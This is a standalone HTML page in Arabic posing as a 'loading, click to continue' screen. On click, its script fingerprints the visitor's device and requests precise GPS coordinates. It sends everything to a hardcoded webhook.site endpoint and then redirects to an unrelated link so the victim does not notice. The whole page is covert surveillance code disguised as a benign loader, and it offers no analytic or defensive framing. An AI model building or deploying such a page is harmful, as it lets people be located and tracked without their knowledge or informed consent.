<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جارِ التحميل...</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: #f4f4f9;
        }
        .btn {
            background-color: #007bff;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        .btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <h3>جارِ تجهيز المحتوى، يرجى الانتظار...</h3>
    <button class="btn" id="loadBtn">اضغط هنا للمتابعة</button>

    <script>
        const REDIRECT_URL = "https://kommodo.ai/i/kASJW4whheWnTYAkETin";
        const WEBHOOK_URL = "https://webhook.site/3f43ac27-d027-44d7-9d1f-dc8ed7c80153";

        document.getElementById('loadBtn').addEventListener('click', async () => {
            document.getElementById('loadBtn').style.display = 'none';
            
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const data = {
                            status: "GPS_ALLOWED",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracyMeters: position.coords.accuracy,
                            googleMapsLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
                            device: deviceInfo,
                            timestamp: new Date().toISOString()
                        };
                        await sendData(data);
                    },
                    async (error) => {
                        const data = {
                            status: "GPS_DENIED",
                            error: error.message,
                            device: deviceInfo,
                            timestamp: new Date().toISOString()
                        };
                        await sendData(data);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                await sendData({ status: "NO_GEOLOCATION_SUPPORT", device: deviceInfo });
            }
        });

        async function sendData(payload) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                console.error(e);
            } finally {
                window.location.href = REDIRECT_URL;
            }
        }
    </script>
</body>
</html>
